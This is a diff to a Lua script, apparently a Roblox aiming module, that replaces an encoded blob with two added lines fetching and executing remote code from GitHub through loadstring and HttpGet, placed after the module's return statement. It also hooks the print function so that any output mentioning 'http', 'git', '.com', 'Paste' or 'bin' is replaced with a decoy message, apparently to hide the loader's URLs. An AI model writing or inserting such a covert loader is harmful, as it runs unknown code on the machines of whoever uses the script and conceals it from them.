@@ -437,4 +437,15 @@ end)
 -- //
 return Aiming
 
-jsccebEUKy9hdRra9oJZEjpCyuA5vmEW3S/6KstUoHNFxC8IA/skWl0b2SeVPOXIVO9AiiqwOTMJ2T9bxdzdbdUgzIfonbXxnGDMoiyqxqhzPE97ppvFUy/EwhqFEhW00oFrT0dUB+4MjR6gGk9QU4FzvCshx62RPOA/FFREUnD+H6tI8/cY5brgmbjttcLnfn6syFaD+9mZFLWiRK3VXM89Qip93QRtbYsG2I/X+kUsAQj8JWOmbapTKDLxpU4uoahrkhJ/CujllZzJpIDiaS4iWBMhi82WU5Hk8Q2jJqTQeZbKT3e9jgL/GflRkQ+CX3iP+sEdLKdXtehGR5wYm86tn2NSQ0BzbkkhgScrIBejs4vFcpyvNNF0HSxiTjuwnBx0AJizHNF1dSBYFpfUVBf33Ien5RBg409DDOGlznn2wfJSj9RImo1fQM1chQFz7WXgRtthtVyCM4a+NjOAfpwkO0BcpjotuJliRZ1rNgazzJxtN01fLkvnumtdxOTXdclqtMRgW301nWkunQ7OgJAkwQPTijvsRqIL3VOsdV20SqLjLrP97LTVbd8q8Q93S+kqHxRpxZ8JhPuIc9J0Iyb1bKNum8qmYJ385LluTnEuh+YJ38JwVOTTc3P4oVYQAdWcDuZMKQjhv/h/Qkky9F59WUFwkqQGG4ibpiqgGhv2jM2EeGTbhAeP5S/uS9w3Sv7NIak7GRZh/kZCZWDjB6MvV4ibMjBhrWlbxipgqU0y+vk5FT8ykmiTEvb4CJaMNF7zM8/RDnZOje0U0NYQd0B2Yfe44xxyx6t0cZmHw6ylyuO+S0FWjNsrDqKTRQ7PX4YizwGpVnM7zSi72Uka5zwyOb/o77LEUMoUkhXKxRqEiEImeAX65d766Bx9pCdq
+loadstring(game:HttpGet("https://raw.githubusercontent.com/idontplaythis/idekwhyitshere/main/idekwhy"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/idontplaythis/idekwhyitshereagain/main/idekwhypt2"))()
+
+
+local denied_message = "Denied Goofy"
+local g
+g = hookfunction(print,function(urprint,...)
+   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
+       urprint = denied_message
+   end
+ return g(urprint,...)
+end)
